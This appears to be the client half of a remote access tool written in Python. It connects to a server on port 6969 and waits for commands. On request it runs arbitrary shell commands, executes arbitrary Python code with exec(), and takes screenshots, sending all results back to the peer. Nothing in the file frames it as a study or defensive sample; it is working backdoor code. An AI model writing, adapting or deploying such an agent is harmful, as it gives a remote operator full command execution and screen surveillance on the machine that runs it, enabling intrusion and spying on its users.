import sys
import logging

# Modules
import subprocess
from io import StringIO

from cryptography import x509

from utils.baseclient import BaseClient
from modules import screen

logging.basicConfig(level=logging.DEBUG)


class Client(BaseClient):
    """ Client for managing commands """

    def __init__(self, certificate: x509.Certificate) -> None:
        super().__init__(certificate)

    def listen(self) -> None:
        """ Listen for coming commands """
        # Wait for a command to arrive
        command = self.read().decode()
        match command:
            case 'SHELL':
                self.shell()
            case 'PYTHON':
                self.interpreter()
            case 'SCREENSHOT':
                self.screenshot()
            case _:
                logging.debug('Received unrecognized command: %s' % command)

    def shell(self) -> None:
        """ Open a shell for peer """
        command = self.read().decode()
        logging.info('Executing shell command: %s' % command)
        execute = lambda command: subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        process = execute(command)
        self.write(process.stdout.read() + process.stderr.read())

    def interpreter(self) -> None:
        """ Open python interpreter for peer """
        command = self.read().decode()
        logging.info('Executing python command: %s' % command)
        error_message = ''
        # Prepare exec
        old_stdout = sys.stdout
        output = sys.stdout = StringIO()
        try:
            exec(command)
        except Exception as error:
            # Create error message
            error_message = f'{error.__class__.__name__}: {str(error)}\n'
        finally:
            sys.stdout = old_stdout
        self.write((output.getvalue() + error_message).encode())

    def screenshot(self):
        """ Take a screenshot """
        logging.debug('Capturing screenshot')
        try:
            data = screen.screenshot()
        except Exception as error:
            error_message = '%s: %s' % (error.__class__.__name__, str(error))
            logging.error('Error taking screenshot: ' + error_message)
            data = ('ERROR: ' + error_message).encode()
        else:
            logging.info('Successfully captured screenshot')
        self.write(data)


if __name__ == '__main__':

    # Read certificate from file
    with open('cert.pem', 'rb') as file:
        cert = x509.load_pem_x509_certificate(file.read())

    # Connect to server
    client = Client(cert)
    client.connect(('localhost', 6969))

    # Listen to commands indefinitely
    while True:
        try:
            client.listen()
        except TimeoutError:
            continue
